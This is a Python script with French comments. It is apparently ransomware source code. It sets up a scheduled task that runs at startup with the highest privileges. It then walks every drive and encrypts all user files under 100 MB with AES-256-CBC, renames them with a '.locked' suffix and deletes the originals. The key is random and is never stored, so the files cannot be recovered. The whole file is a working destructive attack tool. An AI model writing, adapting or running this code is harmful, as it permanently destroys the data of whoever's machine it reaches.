import os
import string
from pathlib import Path
import sys
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import subprocess

# Clé et IV pour AES-256 CBC
key = os.urandom(32)  # 256 bits
iv = os.urandom(16)   # 128 bits

# Extensions de fichiers à exclure
extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com",".locked")

# Dossiers à exclure (en minuscules)
folders_exclus = [
    "windows",
    "program files",
    "program files (x86)",
    "system volume information",
    "$recycle.bin",
    ".git",
    "boot",
    "temp",
    "tmp",
    "cache",
    "appdata",
    "local",
    "microsoft",
    "programdata",
    ".vscode"
]

max_size = 100 * 1024 * 1024



def ajouter_tache_planifiee():
    try:
        # seulement .bat
        dossier = os.path.dirname(os.path.realpath(__file__))
        bat_path = os.path.join(dossier, "start_script.bat")
        #--------
        script_path = os.path.realpath(sys.argv[0])
        task_name = "test_mon_app"

        cmd = f"""
        schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /RL HIGHEST /f
        """
        subprocess.run(["powershell", "-Command", cmd], shell=True)
        print("[+] Tâche planifiée ajoutée.")
    except Exception as e:
        print(f"[!] Erreur tâche planifiée: {e}")


def is_in_excluded_folder(file_path: Path):
    try:
        # Normalise le chemin et récupère les parties du chemin
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_exclus:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception as e:
        print(f"[!] Erreur exclusion sur {file_path}: {e}")
        return True  
        

def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            root_paths.append(drive)
    return root_paths


def encrypte_file(input_file):
    backend = default_backend()

    with open(input_file, 'rb') as f:
        data = f.read()

    # Ajout de padding pour aligner les blocs AES (128 bits)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Création du cipher AES CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Fichier de sortie
    output_file = input_file + ".locked"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)  # on stocke IV au début

    os.remove(input_file)
    print(f"[✓] Fichier chiffré : {input_file}")
    return True


def search_file(base_path):
    base_path = Path(base_path)
    for file in base_path.rglob("*"):
        try:
            if is_in_excluded_folder(file):
                continue

            if file.is_file() and not file.suffix.lower() in extensions_exclues:
                if file.stat().st_size < max_size:
                    encrypte_file(str(file))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")
    return True


def main():
    ajouter_tache_planifiee()
    paths = get_existing_root_path()
    for path in paths:
        search_file(path)


if __name__ == "__main__":
    main()
